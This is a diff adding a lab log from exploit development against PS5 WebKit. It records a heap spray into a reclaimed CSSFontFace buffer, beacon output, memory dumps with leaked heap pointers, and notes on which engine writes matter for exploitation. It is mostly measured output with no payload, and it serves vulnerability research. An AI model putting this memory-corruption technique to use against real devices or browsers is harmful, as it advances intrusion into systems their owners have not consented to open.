@@ -1,0 +1,114 @@
+P588d v8b: COMPLETE ENGINE WRITE MAP (0xAA FILL)
+=================================================
+Date: 2026-11-03 17:52:20 (local)
+Target: PS5 14.10, WebKit 605.1.15
+Probe: probes/phase13_webkit/p588d-forge-chain-oracle.html (v8b variant)
+Beacon log: tools/browser_runner/beacon_logs/beacons_20261103_174125.log lines 29-55
+
+PURPOSE:
+Map every byte the engine modifies in the 192B reclaimed CSSFontFace buffer
+during the trap continuation. Fill all bytes with 0xAA except critical fields
+that must be valid (rc, m_clients area, m_status). Diff at 60ms against expected.
+
+SETUP:
+- Spray 2048 × 192B ArrayBuffers
+- Every byte = 0xAA except:
+  - +0x00..+0x03: rc = 2 (so engine ref() increments to 3)
+  - +0x58..+0x6F: zeros (m_clients hash table area — null = fresh alloc by addClient)
+  - +0x82: 0 (Pending status — if setStatus(Success) runs, changes to 3)
+- Capture at 60ms, diff all 192 bytes against expected pattern
+
+RAW BEACON DATA:
+[2026-11-03 17:52:20.216] BEACON 192.168.1.37: G
+[2026-11-03 17:52:20.256] BEACON 192.168.1.37: F
+[2026-11-03 17:52:20.310] BEACON 192.168.1.37: S2048
+[2026-11-03 17:52:20.410] BEACON 192.168.1.37: HIT=60,rc=3
+[2026-11-03 17:52:20.447] BEACON 192.168.1.37: MODS(10):+0=03 +58=30 +59=ab +5a=1c +5c=10 +68=b0 +69=a0 +6a=9d +6c=10 +85=00
+[2026-11-03 17:52:20.482] BEACON 192.168.1.37: Q00=aaaaaaaa00000003
+[2026-11-03 17:52:20.515] BEACON 192.168.1.37: Q04=aaaaaaaaaaaaaaaa
+[2026-11-03 17:52:20.548] BEACON 192.168.1.37: Q08=aaaaaaaaaaaaaaaa
+[2026-11-03 17:52:20.589] BEACON 192.168.1.37: Q10=aaaaaaaaaaaaaaaa
+[2026-11-03 17:52:20.619] BEACON 192.168.1.37: Q18=aaaaaaaaaaaaaaaa
+[2026-11-03 17:52:20.652] BEACON 192.168.1.37: Q20=aaaaaaaaaaaaaaaa
+[2026-11-03 17:52:20.688] BEACON 192.168.1.37: Q28=aaaaaaaaaaaaaaaa
+[2026-11-03 17:52:20.718] BEACON 192.168.1.37: Q30=aaaaaaaaaaaaaaaa
+[2026-11-03 17:52:20.749] BEACON 192.168.1.37: Q38=aaaaaaaaaaaaaaaa
+[2026-11-03 17:52:20.783] BEACON 192.168.1.37: Q40=aaaaaaaaaaaaaaaa
+[2026-11-03 17:52:20.816] BEACON 192.168.1.37: Q48=aaaaaaaaaaaaaaaa
+[2026-11-03 17:52:20.853] BEACON 192.168.1.37: Q50=aaaaaaaaaaaaaaaa
+[2026-11-03 17:52:20.889] BEACON 192.168.1.37: Q58=00000010001cab30
+[2026-11-03 17:52:20.929] BEACON 192.168.1.37: Q60=0000000000000000
+[2026-11-03 17:52:20.964] BEACON 192.168.1.37: Q68=00000010009da0b0
+[2026-11-03 17:52:21.001] BEACON 192.168.1.37: Q70=aaaaaaaaaaaaaaaa
+[2026-11-03 17:52:21.037] BEACON 192.168.1.37: Q78=aaaaaaaaaaaaaaaa
+[2026-11-03 17:52:21.074] BEACON 192.168.1.37: Q80=aaaa00aaaa00aaaa
+[2026-11-03 17:52:21.110] BEACON 192.168.1.37: Q88=aaaaaaaaaaaaaaaa
+[2026-11-03 17:52:21.149] BEACON 192.168.1.37: STATUS_82=0 (was 0, 3=setStatus ran)
+[2026-11-03 17:52:21.188] BEACON 192.168.1.37: ALIVE
+[2026-11-03 17:52:23.347] BEACON 192.168.1.37: ALIVE2
+
+RESULTS:
+  Hit lane:    60 of 2048
+  Refcount:    3 (from 2 → 3, engine ref())
+
+MODIFIED BYTES (10 total):
+  +0x00       0x02 → 0x03    refcount (ref())
+  +0x58       0x00 → 0x30  \
+  +0x59       0x00 → 0xAB   | m_table = 0x00000010001CAB30
+  +0x5A       0x00 → 0x1C   | (addClient allocated fresh HashTable)
+  +0x5C       0x00 → 0x10  /
+  +0x68       0x00 → 0xB0  \
+  +0x69       0x00 → 0xA0   | m_wrapper = 0x00000010009DA0B0
+  +0x6A       0x00 → 0x9D   | (FontFace* written during continuation)
+  +0x6C       0x00 → 0x10  /
+  +0x85       0xAA → 0x00    unknown boolean field
+
+  Note: +0x5B,+0x5D,+0x5E,+0x5F and +0x6B,+0x6D,+0x6E,+0x6F stayed 0x00
+  (matched expected from our zero spray of +0x58..+0x6F).
+
+UNMODIFIED (key fields):
+  +0x04..+0x57:  all 0xAA (no engine reads/writes in this range)
+  +0x60..+0x67:  all 0x00 (WeakHashSet op counters, per cobrajet #179 audit)
+  +0x70..+0x81:  all 0xAA
+  +0x82:         0x00 — STAYED PENDING (setStatus() did NOT run)
+  +0x83..+0x84:  0xAA (untouched)
+  +0x86..+0xBF:  all 0xAA
+
+QWORD DUMP (all 192 bytes, 8B per line):
+  Q00: aaaaaaaa00000003  (rc=3 at +0x00, 0xAA fill at +0x04..+0x07)
+  Q04: aaaaaaaaaaaaaaaa
+  Q08: aaaaaaaaaaaaaaaa
+  Q10: aaaaaaaaaaaaaaaa
+  Q18: aaaaaaaaaaaaaaaa
+  Q20: aaaaaaaaaaaaaaaa
+  Q28: aaaaaaaaaaaaaaaa
+  Q30: aaaaaaaaaaaaaaaa
+  Q38: aaaaaaaaaaaaaaaa
+  Q40: aaaaaaaaaaaaaaaa
+  Q48: aaaaaaaaaaaaaaaa
+  Q50: aaaaaaaaaaaaaaaa
+  Q58: 00000010001cab30  (T = m_table)
+  Q60: 0000000000000000  (op counters unchanged)
+  Q68: 00000010009da0b0  (W = m_wrapper)
+  Q70: aaaaaaaaaaaaaaaa
+  Q78: aaaaaaaaaaaaaaaa
+  Q80: aaaa00aaaa00aaaa  (+0x82=0 status, +0x85=0 unknown bool)
+  Q88: aaaaaaaaaaaaaaaa
+
+CONCLUSION:
+The trap continuation writes exactly 10 bytes:
+  1. ref()       → increments +0x00 refcount
+  2. addClient() → writes T (fresh HashTable*) at +0x58, W (FontFace*) at +0x68
+  3. Unknown     → zeros one byte at +0x85
+
+setStatus() does NOT execute during the trap continuation:
+  +0x82 stayed at 0 (Pending). If setStatus(Success) had run, it would have
+  written 3 (Success) and then called iterateClients() to notify clients.
+  Neither happened.
+
+The corrected walk model (vincenzoiacovone: copyToVectorOf<Ref<Client>> with
+ref() dispatch at +0x30, deref() at +0x38) is irrelevant to exploitation
+because the walk never fires — not from the continuation (no setStatus) and
+not from JS (backing() null per v7).
+
+GRADE: [M] device-measured on 14.10
